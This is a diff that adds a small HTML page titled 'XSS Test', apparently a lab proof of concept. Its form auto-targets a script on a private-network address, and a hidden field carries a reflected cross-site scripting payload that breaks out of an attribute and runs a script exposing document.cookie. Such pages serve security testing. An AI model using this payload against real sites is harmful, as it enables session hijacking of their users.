@@ -1,0 +1,12 @@
+<html>
+<head>
+<title>XSS Test</title>
+</head>
+<body><center>XSS Test
+<form action="http://192.168.1.5/xss/xss.php" method="POST">
+<input type=hidden name="keyword" value="><script>alert(document.cookie)</script>">
+<input type=hidden name="mode" value="xss1">
+<INPUT TYPE=SUBMIT>
+</form>
+</body>
+</html>
